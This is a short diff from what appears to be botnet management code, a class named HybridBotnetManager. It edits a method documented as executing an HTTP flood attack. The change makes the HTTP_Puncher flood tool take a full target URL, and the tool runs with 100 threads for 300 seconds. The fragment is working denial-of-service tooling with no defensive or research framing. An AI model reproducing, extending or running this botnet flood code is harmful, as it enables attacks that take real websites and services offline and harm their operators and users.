@@ -501,11 +501,9 @@ class HybridBotnetManager:
         """Execute HTTP flood attack"""
         try:
             if BANE_AVAILABLE:
-                # Parse target to get host and port
-                host, port = self.parse_target(target)
+                # HTTP_Puncher takes full URL directly
                 attacker = HTTP_Puncher(
-                    u=host,
-                    p=port,
+                    u=target,
                     threads=100,
                     timeout=5,
                     duration=300
